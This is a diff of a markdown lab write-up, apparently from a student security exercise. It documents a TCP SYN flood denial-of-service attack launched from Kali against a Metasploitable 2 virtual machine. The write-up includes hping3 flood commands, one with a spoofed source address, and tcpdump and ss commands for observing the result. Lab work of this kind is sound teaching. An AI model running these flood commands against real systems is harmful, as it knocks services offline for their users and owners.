@@ -20,11 +20,12 @@ We analyze the capture (web.pcap) using Wireshark, sorted the HTTP protocol and 
 
 Using Kali, router and ms2 virtual machines I launched a TCP SYN Flood Dos attack on metasploitable 2 (ms2 - 172.16.1.35).
 
-### Commands Terminal 1
+### Commands Terminal 1 to attack port 80
 
-````bash
+```bash
 sudo hping3 --syn -p 80 --spoof 172.16.1.1 --flood ms2
 sudo hping3 --syn --data 120 -p 80 --flood ms2
+```
 
 What it does:
 
@@ -38,8 +39,10 @@ What it does:
 
 ```bash
 sudo tcpdump -i eth1
+```
 
-On the other end, used the following command in ms2 to see the output of the attack.
+### Commands in MS2 to see the output of the attack.
 
-<li>  Ms2$sleep 5 ; ss -a |grep :www</li>
-````
+```
+Ms2$sleep 5 ; ss -a |grep :www
+```
